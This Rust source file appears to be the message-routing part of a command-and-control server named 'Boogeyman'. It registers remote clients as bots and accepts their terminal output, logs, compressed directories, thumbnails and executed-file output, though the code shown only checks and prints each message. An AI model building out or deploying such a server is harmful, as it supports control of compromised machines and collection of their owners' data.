use std::sync::Arc;
use chrono::Utc;
use client_vars::types::send::{ BoogeymanSendPayload, ServerAction, ServerParams };
use tokio::{ net::TcpStream, sync::Mutex };
use anyhow::Result;
use crate::server::{
    http_server::{ Bot, ClientInstance, ServerHandler },
    sanitization::verify_client_init,
};

pub async fn route_client(
    handler: &ServerHandler,
    payload: BoogeymanSendPayload,
    stream_ref: Arc<Mutex<TcpStream>>
) -> Result<()> {
    match payload.action {
        ServerAction::Init => {
            return init(handler, payload, stream_ref).await;
        }
        ServerAction::TerminalOutput => {
            // in each - verify id and version - must exist in inited list if not ignore
            if let ServerParams::TerminalOutput(params) = &payload.params {
                println!("Received {:#?}:{:#?}", payload.action, params);
            } else {
                return Err(anyhow::anyhow!(format!("Invalid params for: {:#?}", payload.action)));
            }
        }
        ServerAction::LogsData => {
            if let ServerParams::LogsData(params) = &payload.params {
                println!("Received {:#?}:{:#?}", payload.action, params);
            } else {
                return Err(anyhow::anyhow!(format!("Invalid params for: {:#?}", payload.action)));
            }
        }
        ServerAction::CompressedDir => {
            if let ServerParams::CompressedDir(params) = &payload.params {
                println!("Received {:#?}:{:#?}", payload.action, params);
            } else {
                return Err(anyhow::anyhow!(format!("Invalid params for: {:#?}", payload.action)));
            }
        }
        ServerAction::UpdateThumbnail => {
            if let ServerParams::UpdateThumbnail(params) = &payload.params {
                println!("Received {:#?}:{:#?}", payload.action, params);
            } else {
                return Err(anyhow::anyhow!(format!("Invalid params for: {:#?}", payload.action)));
            }
        }
        ServerAction::UpdateDynamicData => {
            if let ServerParams::UpdateDynamicData(params) = &payload.params {
                println!("Received {:#?}:{:#?}", payload.action, params);
            } else {
                return Err(anyhow::anyhow!(format!("Invalid params for: {:#?}", payload.action)));
            }
        }
        ServerAction::ExecFileOutput => {
            if let ServerParams::ExecFileOutput(params) = &payload.params {
                println!("Received {:#?}:{:#?}", payload.action, params);
            } else {
                return Err(anyhow::anyhow!(format!("Invalid params for: {:#?}", payload.action)));
            }
        }
    }
    Ok(())
}

pub async fn init(
    handler: &ServerHandler,
    payload: BoogeymanSendPayload,
    stream_ref: Arc<Mutex<TcpStream>>
) -> Result<()> {
    if let ServerParams::Init(params) = payload.params {
        verify_client_init(&params)?;
        // first sanitize botstate
        let mut bot_map = handler.bot_map.write().await;
        let client_new_instance = ClientInstance {
            join_date: Utc::now().to_rfc3339(),
            version: payload.version,
            bot_state: params.bot_state,
            console: String::new(),
        };
        if let Some(bot) = bot_map.get_mut(&payload.id) {
            bot.client_instances.push(client_new_instance);
            bot.verified = true;
        } else {
            bot_map.insert(
                payload.id.clone(),
                Bot::new(payload.id.clone(), vec![client_new_instance], vec![], true, None)
            );
        }
        println!("Bot map: {:#?}", bot_map);
        Ok(())
    } else {
        return Err(anyhow::anyhow!(format!("Invalid params for: {:#?}", payload.action)));
    }
}
